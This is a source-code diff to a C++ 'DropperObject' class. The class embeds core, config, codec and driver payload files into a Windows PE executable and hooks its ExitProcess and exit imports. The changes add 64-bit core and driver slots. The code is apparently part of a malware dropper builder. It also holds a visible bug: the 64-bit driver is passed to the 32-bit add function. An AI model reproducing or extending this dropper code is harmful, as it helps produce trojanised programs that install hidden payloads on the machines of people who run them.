@@ -23,9 +23,11 @@ DropperObject::DropperObject(PEObject& pe)
 :  _data(0), _size(0), _pe(pe), _epOffset(0)
 {
 	_files.core.size = 0;
+	_files.core64.size = 0;
 	_files.config.size = 0;
 	_files.codec.size = 0;
 	_files.driver.size = 0;
+	_files.driver64.size = 0;
 	
 	int i = 0;
 	while (_needed_strings[i] != NULL) {
@@ -41,8 +43,11 @@ DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint )
 	unsigned int buffer_size = 65535 // account for header and accessory data (strings, calls, etc)
 		+ _files.codec.size
 		+ _files.core.size
+		+ _files.core64.size
 		+ _files.config.size
-		+ _files.driver.size;
+		+ _files.driver.size
+		+ _files.driver64.size
+		;
 	
 	_data.reset( new char[buffer_size] );
 	char * ptr = _data.get();
@@ -210,11 +215,25 @@ bool DropperObject::_addCoreFile( std::string path, std::string name )
 	return _readFile(path, _files.core);	
 }
 
+bool DropperObject::_addCore64File( std::string path, std::string name )
+{
+	cout << "Adding core (64 bit) file \"" << path << "\" as \"" << name << "\"." << endl;
+	_files.core64.name = name;
+	return _readFile(path, _files.core64);	
+}
+
 bool DropperObject::_addDriverFile( std::string path, std::string name )
 {
 	cout << "Adding driver file \"" << path << "\" as \"" << name << "\"." << endl;
 	_files.driver.name = name;
 	return _readFile(path, _files.driver);
+}
+
+bool DropperObject::_addDriver64File( std::string path, std::string name )
+{
+	cout << "Adding driver file \"" << path << "\" as \"" << name << "\"." << endl;
+	_files.driver64.name = name;
+	return _readFile(path, _files.driver64);
 }
 
 bool DropperObject::_addConfigFile( std::string path, std::string name )
@@ -307,7 +326,7 @@ bool DropperObject::_readFile( std::string path, NamedFileBuffer& buffer )
 	return true;
 }
 
-bool DropperObject::build( bf::path core, bf::path config, bf::path codec, bf::path driver, std::string installDir )
+bool DropperObject::build( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir )
 {
 	try {
 		_setExecutableName("XXX");
@@ -316,11 +335,17 @@ bool DropperObject::build( bf::path core, bf::path config, bf::path codec, bf::p
 		_addCoreFile(core.string(), core.filename());
 		_addConfigFile(config.string(), config.filename());
 		
+		if (!core64.empty())
+			_addCore64File(core64.string(), core64.filename());
+
 		if (!codec.empty())
 			_addCodecFile(codec.string(), codec.filename());
 		
 		if (!driver.empty())
 			_addDriverFile(driver.string(), driver.filename());
+
+		if (!driver64.empty())
+			_addDriverFile(driver64.string(), driver64.filename());
 		
 		_hookedCalls["ExitProcess"] = _getIATCallIndex(std::string("kernel32.dll"), std::string("ExitProcess"));	
 		_hookedCalls["exit"] = _getIATCallIndex(std::string("msvcrt.dll"), std::string("exit"));
